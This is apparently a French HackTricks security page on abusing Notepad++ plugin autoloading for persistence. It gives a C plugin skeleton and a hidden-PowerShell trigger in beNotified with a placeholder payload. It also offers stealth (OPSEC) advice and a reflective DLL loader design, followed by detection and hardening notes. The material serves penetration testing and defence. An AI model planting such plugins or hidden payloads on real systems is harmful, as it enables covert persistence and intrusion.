# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ **charge automatiquement chaque DLL de plugin trouvée dans ses sous-dossiers `plugins`** au démarrage. Déposer un plugin malveillant dans toute **installation Notepad++ accessible en écriture** permet d'exécuter du code dans `notepad++.exe` à chaque démarrage de l'éditeur, ce qui peut être exploité pour la **persistence**, une **initial execution** discrète ou comme **in-process loader** si l'éditeur est lancé avec des privilèges élevés.<sup>[[1]](#references)</sup>

Depuis **Notepad++ 7.6+**, la structure attendue pour une installation manuelle est **un sous-dossier par plugin** (`plugins\<PluginName>\<PluginName>.dll`). En **mode portable** (présence de `doLocalConf.xml` à côté de `notepad++.exe`), toute l'arborescence de l'application reste locale à ce répertoire, ce qui transforme souvent les bundles d'outils copiés ou administratifs en une surface d'exécution facilement accessible en écriture pour l'utilisateur.<sup>[[2]](#references)</sup>

## Emplacements de plugins accessibles en écriture

- Installation standard : `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (nécessite généralement des privilèges administrateur pour l'écriture).<sup>[[1]](#references)</sup>
- Options accessibles en écriture pour les opérateurs disposant de faibles privilèges :<sup>[[1]](#references)</sup>
- Utiliser la **version portable de Notepad++** dans un dossier accessible en écriture pour l'utilisateur.
- Copier `C:\Program Files\Notepad++` vers un chemin contrôlé par l'utilisateur (par exemple `%LOCALAPPDATA%\npp\`) et exécuter `notepad++.exe` depuis cet emplacement.
- Rechercher des **bundles d'outils administrateur**, des copies extraites d'archives zip ou des toolkits de support déjà munis de `doLocalConf.xml` et situés en dehors de `Program Files`.
- Chaque plugin possède son propre sous-dossier sous `plugins` et est chargé automatiquement au démarrage ; les entrées de menu apparaissent sous **Plugins**.<sup>[[2]](#references)</sup>

Triage rapide :
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Points de chargement du plugin (primitives d’exécution)
Notepad++ attend des **fonctions exportées** spécifiques. Elles sont toutes appelées pendant l’initialisation, offrant plusieurs surfaces d’exécution :<sup>[[1]](#references)</sup>
- **`DllMain`** — s’exécute immédiatement lors du chargement de la DLL (premier point d’exécution).
- **`setInfo(NppData)`** — appelée une fois lors du chargement pour fournir les handles de Notepad++ ; emplacement typique pour enregistrer les éléments de menu.
- **`getName()`** — renvoie le nom du plugin affiché dans le menu.
- **`getFuncsArray(int *nbF)`** — renvoie les commandes du menu ; même si le tableau est vide, cette fonction est appelée au démarrage.
- **`beNotified(SCNotification*)`** — reçoit les événements de Notepad++ / Scintilla (utile pour différer les payloads jusqu’à une action utilisateur ou un événement de l’éditeur).
- **`messageProc(UINT, WPARAM, LPARAM)`** — gestionnaire de messages, utile pour des échanges de données plus importants.
- **`isUnicode()`** — indicateur de compatibilité vérifié lors du chargement.

La plupart des exports peuvent être implémentés comme des **stubs** ; l’exécution peut avoir lieu depuis `DllMain` ou n’importe quel callback ci-dessus lors de l’autoload.

## Squelette minimal de plugin malveillant
Compilez une DLL avec les exports attendus et placez-la dans `plugins\\MyNewPlugin\\MyNewPlugin.dll`, sous un dossier Notepad++ accessible en écriture :<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compilez la DLL (Visual Studio/MinGW).
2. Créez le sous-dossier du plugin sous `plugins` et déposez-y la DLL.
3. Redémarrez Notepad++ ; la DLL est automatiquement chargée, ce qui exécute `DllMain` et les callbacks suivants.

## Pattern de déclenchement low-noise via `beNotified`
Pour l’OPSEC, de nombreux payloads ne devraient **pas se déclencher depuis `DllMain`**. Une approche plus discrète consiste à laisser le plugin se charger proprement, puis à l’exécuter uniquement après un événement réaliste de l’éditeur, tel que **la fin du démarrage**, **l’activation d’un buffer** ou **la première saisie d’un caractère**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Cela correspond mieux aux recherches offensives publiques qu’un beacon bruyant dans `DllMain` : la DLL est toujours chargée automatiquement au démarrage, mais l’action malveillante est différée jusqu’à ce que Notepad++ soit réellement utilisé.

## Utiliser le répertoire de configuration des plugins comme stockage secondaire
Notepad++ expose `NPPM_GETPLUGINSCONFIGDIR`, qui renvoie le **répertoire de configuration des plugins de l’utilisateur actuel**.<sup>[[3]](#references)</sup> Un plugin malveillant peut l’utiliser pour conserver une DLL minimale sur le disque tout en stockant une configuration chiffrée, des payloads préparés ou des fichiers de commande dans un chemin qui se fond dans l’état normal des plugins.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Sur le plan opérationnel, c'est utile lorsque vous voulez :
- une petite DLL bootstrap chargée automatiquement ;
- du tasking par utilisateur sans modifier à nouveau le binaire principal du plugin ;
- séparer le **déclencheur autoload** de la seconde étape plus lourde.

## Pattern de plugin Reflective loader
Un plugin weaponized peut transformer Notepad++ en **reflective DLL loader** :<sup>[[1]](#references)</sup>
- Présenter une entrée d'interface/menu minimale (par exemple, « LoadDLL »).
- Accepter un **chemin de fichier** ou une **URL** pour récupérer une DLL payload.
- Mapper la DLL de manière reflective dans le processus actuel et appeler un point d'entrée exporté (par exemple, une fonction loader à l'intérieur de la DLL récupérée).
- Avantage : réutiliser un processus GUI d'apparence légitime au lieu de lancer un nouveau loader ; le payload hérite du niveau d'intégrité de `notepad++.exe` (y compris dans les contextes élevés).
- Compromis : déposer une **DLL de plugin unsigned** sur le disque est bruyant ; une variante pratique consiste à utiliser le plugin chargé automatiquement uniquement comme stub et à conserver le véritable implant chiffré/stagé ailleurs.

## Notes de détection et de hardening
- Bloquer ou surveiller les **écritures dans les répertoires de plugins de Notepad++** (y compris les copies portables dans les profils utilisateur) ; activer controlled folder access ou l'allowlisting des applications.
- Déclencher une alerte sur les **nouvelles DLL unsigned** sous `plugins`, les modifications des arborescences Notepad++ portables et les **processus enfants/activités réseau inhabituels** provenant de `notepad++.exe`.
- Établir une baseline des plugins légitimes et analyser toute nouvelle DLL qui exporte l'interface normale des plugins Notepad++ tout en lançant également des shells, PowerShell ou des network beacons.
- Imposer l'installation des plugins via **Plugins Admin** uniquement et restreindre l'exécution des copies portables depuis des chemins non fiables.

## Références

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
